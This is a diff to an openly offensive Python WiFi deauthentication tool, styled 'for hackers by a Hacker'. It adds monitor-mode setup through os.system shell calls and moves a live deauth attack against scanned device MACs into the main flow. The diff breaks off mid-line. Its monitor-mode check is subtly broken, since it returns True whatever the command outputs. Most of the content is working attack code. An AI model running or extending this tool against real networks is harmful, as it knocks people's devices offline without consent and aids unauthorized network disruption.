@@ -15,6 +15,26 @@ RESET = "\033[0m"
 attack_running = True  # Global variable to control the attack state
 ping_queue = Queue()
 
+def check_monitor_mode(interface):
+    """Check if the network interface supports monitor mode."""
+    try:
+        os.system(f"iwconfig {interface} | grep 'Mode:Monitor'")
+        return True
+    except Exception:
+        return False
+
+def enable_monitor_mode(interface):
+    """Enable monitor mode on the given interface."""
+    try:
+        os.system(f"ifconfig {interface} down")
+        os.system(f"iwconfig {interface} mode monitor")
+        os.system(f"ifconfig {interface} up")
+        print(f"{GOLD}Monitor mode enabled on {interface}{RESET}")
+        return True
+    except Exception as e:
+        print(f"{RED}Failed to enable monitor mode: {e}{RESET}")
+        return False
+
 def send_deauth_packet(interface, target_mac, access_point_mac):
     """Send deauthentication packets to the target MAC address."""
     dot11 = Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac)
@@ -41,7 +61,7 @@ def live_attack(interface, target_macs, access_point_macs):
 
             time.sleep(random.uniform(0.1, 0.5))  # Optional delay
     except KeyboardInterrupt:
-        print(f"\n{RED}Rolling baack...!{RESET}")
+        print(f"\n{RED}Rolling back...!{RESET}")
     finally:
         attack_running = False
 
@@ -100,7 +120,7 @@ def mdns_scan(interface):
 
     # Send the mDNS packet and receive the response
     answered_list = srp(packet, iface=interface, timeout=2, verbose=False)[0]
-    
+
     mdns_devices = {}
     for element in answered_list:
         ip_address = element[1][IP].src
@@ -110,37 +130,19 @@ def mdns_scan(interface):
     return mdns_devices
 
 def scan_for_devices(interface):
-    """Perform combined ARP scan, mDNS scan, SNMP sweep, and deauthentication attack."""
+    """Perform combined ARP scan and mDNS scan."""
     print(f"{GOLD}Performing target scan on {interface},please wait...{RESET}")
 
     # Initial ARP scan
     arp_devices = perform_arp_scan(interface)
     print(f"{GOLD}Initial ARP scan detected {len(arp_devices)} devices.{RESET}")
-    
+
     # Perform mDNS scan
     mdns_devices = mdns_scan(interface)
     print(f"{GOLD}mDNS scan detected {len(mdns_devices)} devices.{RESET}")
-    
+
     # Combine detected devices
     combined_devices = {**arp_devices, **mdns_devices}
-
-    # Perform a live deauthentication attack to force devices to reconnect
-    if combined_devices:
-        target_macs = list(combined_devices.values())
-        access_point_mac = target_macs[0]  # Assuming the first MAC is the AP
-        live_attack(interface, target_macs, [access_point_mac] * len(target_macs))
-
-    # Re-scan for devices after the deauthentication attack
-    new_arp_devices = perform_arp_scan(interface)
-    new_mdns_devices = mdns_scan(interface)
-
-    if len(new_arp_devices) > len(combined_devices):
-        print(f"{GOLD}Deauth attack revealed additional targets!{RESET}")
-    else:
-        print(f"{RED}No additional targets detected after deauth attack.{RESET}")
-
-    combined_devices.update(new_arp_devices)
-    combined_devices.update(new_mdns_devices)
 
     print(f"{GOLD}Final targets detected on this network:{RESET}")
     for ip, mac in combined_devices.items():
@@ -150,10 +152,11 @@ def scan_for_devices(interface):
 
 def main():
     os.system("clear")
-    print_banner()  
+    print_banner()
     print(f"{GOLD}Welcome to Tin-Gate WiFi deauth-attack Tool for hackers by a Hacker{RESET}")
     print(f"{GRAY}“The night is darkest just before the dawn.”{RESET} – {RED}The Dark Knight{RESET}")
     print(f"{GRAY}Scripted by b0urn3 IG: onlybyhive Github: q4n0{RESET}\n")
+    
     # Get Interfaces
     interfaces = get_if_list()
     print(f"{GOLD}Available interfaces:{RESET}")
@@ -168,10 +171,18 @@ def main():
                 raise ValueError
             break
         except ValueError:
-            print(f"{RED}You made a bad choice. Lets try that again.{RESET}")
+            print(f"{RED}You made a bad choice. Let's try that again.{RESET}")
 
     interface = interfaces[choice]
+
+    # Check and enable monitor mode if necessary
+    if not check_monitor_mode(interface):
+        enable_monitor_mode(interface)
+
+    # Scan for devices
     devices = scan_for_devices(interface)
 
-if __name__ == "__main__":
-    main()
+    # Live attack (if any devices were found)
+    if devices:
+        target_macs = list(devices.values())
+        access_point_mac = target_macs[
